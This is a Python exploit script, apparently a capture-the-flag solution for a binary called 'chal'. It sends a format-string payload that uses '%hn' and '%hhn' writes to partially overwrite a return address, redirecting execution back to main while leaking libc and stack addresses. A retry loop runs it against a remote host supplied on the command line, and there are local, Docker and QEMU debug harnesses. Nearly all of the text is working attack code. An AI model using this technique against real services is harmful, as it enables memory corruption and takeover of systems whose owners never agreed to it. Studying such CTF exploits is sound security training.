#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.update(
    log_level='debug',
    arch='amd64', # Maybe change this
    os='linux',   # Maybe change this
    binary=ELF('./chal', checksec=False),
    terminal=[
        "wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".",
        "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"
    ]
)
exe = context.binary
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x11D1
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    elif args.DOCKER:
        p = remote("localhost", 5000)
        context.update(terminal=['tmux', 'new-window', '-n', 'GDB-Debug', '-P', '-d']) # Need to use tmux
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            # Open port 5000 for target remote in GDB
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=False)

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

# ==================== EXPLOIT ====================

PIVOT_OFFSET = 6
RET_ADDR_OFFSET = 51
RET_ADDR_PARTIAL = 0xdad8
TARGET = (0x6d - (RET_ADDR_PARTIAL & 0xff)) & 0xff

info('TARGET @ %#x', TARGET)

payload = '%c' * (PIVOT_OFFSET - 2)+ f'%{RET_ADDR_PARTIAL - (PIVOT_OFFSET - 2)}c' + '%hn' # First write to offset 21
payload += f'%{TARGET}c%{RET_ADDR_OFFSET}$hhn'                  # Second write to offset 51 -> ret2main
payload += '|%17$p|%24$p|'

fmt_payload = payload.encode()
# print(fmt_payload)
# print(len(fmt_payload))

# debug()
if args.REMOTE:
    for i in range(10):
        try:
            p = start()
            sla(b'echoed: ', fmt_payload)
            ru(b'|')
            data = r(4096).split(b'|')
            print(data)
            libc.address = int(data[0], 16)
            stack_leak = int(data[1], 16)
            print(f'libc base  @ {hex(libc.address)}')
            print(f'stack leak @ {hex(stack_leak)}')
            break
        except Exception as e:
            log.failure(f'Try {i+1} failed: {e}')
            try: p.close()
            except: pass
            sleep(0.3)
    else:
        log.error('All retries failed.')
        exit(1)
else:
    p = start()
    sla(b'echoed: ', fmt_payload)
    ru(b'|')
    data = r(4096).split(b'|')
    print(data)
    # libc.address = int(data[0], 16) - 0x29d90
    libc.address = int(data[0], 16)

    stack_leak = int(data[1], 16)
    slog(f'libc base  @ {hex(libc.address)}')
    slog(f'stack leak @ {hex(stack_leak)}')

interactive(flag=False)
